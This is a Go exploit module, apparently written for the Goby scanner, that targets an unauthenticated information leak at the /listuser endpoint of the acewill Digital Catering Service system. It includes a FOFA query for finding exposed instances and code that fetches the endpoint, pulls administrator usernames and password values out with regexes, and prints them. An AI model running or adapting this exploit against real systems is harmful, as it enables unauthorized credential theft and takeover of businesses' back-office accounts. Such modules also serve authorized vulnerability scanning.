package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "acewill-Digital-Catering-Service /listuser Information Disclosure Vulnerability",
    "Description": "<p>Digital Catering Service System is a comprehensive management software designed for catering enterprises, aiming to improve the operational efficiency of catering enterprises, reduce operating costs, and realize data-driven decision-making management through information technology. The system includes multiple modules such as supply chain management, financial management, store inspection management, human resource management, etc., which can fully cover the daily operation needs of catering enterprises. Covering all aspects of catering enterprises from procurement, inventory, sales to finance, human resources, etc., to achieve integrated management.</p><p>There is an information leakage · vulnerability at the listuser interface of the Nebula Digital Catering Service System, and an unauthenticated remote attacker can exploit this vulnerability to read the background administrator account password login credential information, resulting in background authority control, resulting in information leakage, and putting the system in an extremely insecure state.</p>",
    "Product": "acewill-Digital-Catering-Service",
    "Homepage": "https://acewill.cn/about.html",
    "DisclosureDate": "2024-07-04",
    "PostTime": "2024-10-28",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title=\"喰星云·数字化餐饮服务系统\" && body=\"/html/js/md5.js\"",
    "GobyQuery": "title=\"喰星云·数字化餐饮服务系统\" && body=\"/html/js/md5.js\"",
    "Level": "1",
    "Impact": "<p>There is an information leakage · vulnerability at the listuser interface of the Nebula Digital Catering Service System, and an unauthenticated remote attacker can exploit this vulnerability to read the background administrator account password login credential information, resulting in background authority control, resulting in information leakage, and putting the system in an extremely insecure state.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. 2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/139838908"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "userMessage",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "喰星云·数字化餐饮服务系统 /listuser 信息泄露漏洞",
            "Product": "喰星云·数字化餐饮服务系统",
            "Description": "<p>喰星云·数字化餐饮服务系统是一款专为餐饮企业设计的综合性管理软件，旨在通过信息化手段提升餐饮企业的运营效率、降低运营成本，并实现数据驱动的决策管理。该系统包括供应链管理、财务管理、巡店管理、人力资源管理等多个模块，可全面覆盖餐饮企业的日常运营需求。覆盖餐饮企业从采购、库存、销售到财务、人力资源等各个环节，实现一体化管理。<br></p><p>喰星云·数字化餐饮服务系统 listuser 接口处存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞读取后台管理员账号密码登录凭证信息，导致后台权限被控，造成信息泄露，使系统处于极不安全的状态。<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>喰星云·数字化餐饮服务系统 listuser 接口处存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞读取后台管理员账号密码登录凭证信息，导致后台权限被控，造成信息泄露，使系统处于极不安全的状态。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "acewill-Digital-Catering-Service /listuser Information Disclosure Vulnerability",
            "Product": "acewill-Digital-Catering-Service",
            "Description": "<p>Digital Catering Service System is a comprehensive management software designed for catering enterprises, aiming to improve the operational efficiency of catering enterprises, reduce operating costs, and realize data-driven decision-making management through information technology. The system includes multiple modules such as supply chain management, financial management, store inspection management, human resource management, etc., which can fully cover the daily operation needs of catering enterprises. Covering all aspects of catering enterprises from procurement, inventory, sales to finance, human resources, etc., to achieve integrated management.</p><p>There is an information leakage · vulnerability at the listuser interface of the Nebula Digital Catering Service System, and an unauthenticated remote attacker can exploit this vulnerability to read the background administrator account password login credential information, resulting in background authority control, resulting in information leakage, and putting the system in an extremely insecure state.<br></p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. <br>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is an information leakage · vulnerability at the listuser interface of the Nebula Digital Catering Service System, and an unauthenticated remote attacker can exploit this vulnerability to read the background administrator account password login credential information, resulting in background authority control, resulting in information leakage, and putting the system in an extremely insecure state.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`
	postOrGet_asfjiashfgausgftugwsetyufguywerhfutgwyefgwetygfvrtysdghfgtyasvfrtyastuftgagf := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		requestConfig := httpclient.NewGetRequestConfig(fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/chainsales/head/user/listuser"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/chainsales/head/user/listuser": "\"dingding_user\":",
			}
			// 函数继承
			uploadFileFunc := postOrGet_asfjiashfgausgftugwsetyufguywerhfutgwyefgwetygfvrtysdghfgtyasvfrtyastuftgagf

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"userMessage": {"/chainsales/head/user/listuser", "admin"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_asfjiashfgausgftugwsetyufguywerhfutgwyefgwetygfvrtysdghfgtyasvfrtyastuftgagf

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			// 定义正则表达式模式
			pattern := `"username":"(.*?)",`
			// 编译正则表达式
			re := regexp.MustCompile(pattern)
			if !re.MatchString(resp) {
				expResult.Output += "not match"
				expResult.Success = false
				return expResult
			}
			// 在文本中查找匹配项
			match := re.FindStringSubmatch(resp)
			// 提取URL字段
			u := match[1]
			expResult.Output = "Key Messge: \r\nusername = " + u

			// 定义正则表达式模式
			pattern = `"pwd":"(.*?)",`
			// 编译正则表达式
			re = regexp.MustCompile(pattern)
			if !re.MatchString(resp) {
				expResult.Output += "not match"
				expResult.Success = false
				return expResult
			}
			// 在文本中查找匹配项
			match = re.FindStringSubmatch(resp)
			// 提取URL字段
			u = match[1]
			expResult.Output += "\r\npwd = " + u

			expResult.Output += "\r\n\r\nALL Message : \r\n" + resp
			expResult.Success = true
			return expResult
		},
	))
}
